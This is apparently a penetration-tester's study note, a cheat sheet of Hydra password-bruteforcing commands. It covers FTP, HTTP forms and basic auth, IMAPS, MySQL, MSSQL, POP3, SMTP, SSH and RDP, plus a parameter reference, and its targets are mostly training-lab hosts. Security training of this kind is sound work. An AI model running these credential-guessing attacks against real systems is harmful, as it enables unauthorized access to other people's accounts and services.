---
type: tool
category: bruteforce
tags:
  - tool
---
# Overview

## Quick Commands

### FTP
#### Bruteforcing FTP
```bash
hydra -l "fiona" -P /home/breezy/Downloads/pws.list -s 21 -t 2 -c 1 -vV -f 10.129.219.75 ftp
```

### HTTP
#### Bruteforcing HTTP (POST) - Hydra
##### With form
```bash
hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt  154.57.164.65 -s 37581 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```
In this example we are using the inputfields of the HTML-form `name="username"` and `name="password"`. The "fail-condition" (which filters all failed attempts, meaning responses which contain it's value) here is `Invalid credentials`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261015113150.png)
#### Bruteforcing HTTP (GET) - Hydra

##### Without form
```bash
hydra -l basic-auth-user -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt  154.57.164.74 -s 33692 http-get /
```

### IMAPS
#### Bruteforcing IMAPS
Bruteforcing with username and password list, stops (-f) after first found valid credentials:
```bash
hydra -L userlist.txt -P /usr/share/wordlists/rockyou.txt -s 993 -S -vV -f 10.129.165.204 imap
```
^af4fd2

### MySQL
#### Bruteforcing MySQL
```bash
hydra -l "fiona" -P /home/breezy/Downloads/pws.list -s 3306 -vV -f 10.129.219.75 mysql
```

### MSSQL
#### Bruteforcing MySQL
```bash
hydra -l "john" -P IT/John/secrets.txt -s 1433 -vV -f 10.129.203.10 mssql
```

### POP3
#### Bruteforcing POP3
```bash
hydra -l "marlin@inlanefreight.htb" -P /home/breezy/Downloads/pws.list  -f inlanefreight.htb pop3
```

^e4dc09

### SMTP
#### Bruteforcing SMTP
```bash
hydra -l "fiona@inlanefreight.htb" -P /home/breezy/Downloads/pws.list -s 25 -vV -f 10.129.219.75 smtp
```

### SSH
#### Bruteforcing
```bash
hydra -L user.list -P password.list -f ssh://10.129.42.197
```
^ec80b8

### RDP 
#### Bruteforcing
```bash
hydra -L user.list -P password.list -f rdp://10.129.42.197
```
^6b8cd0

## Important Parameter
hydra
	`-t` = specifiy amount of threads
	`-c` = implement pause between request in seconds (values below 1 possible)
	`-w` = implement timeout between requests in seconds (no values below 1)
	`-S` = forces an enrypted connection over ssl/tls
	`-M TARGETS.TXT` = specify multiple targets
	`-s` = specify port
	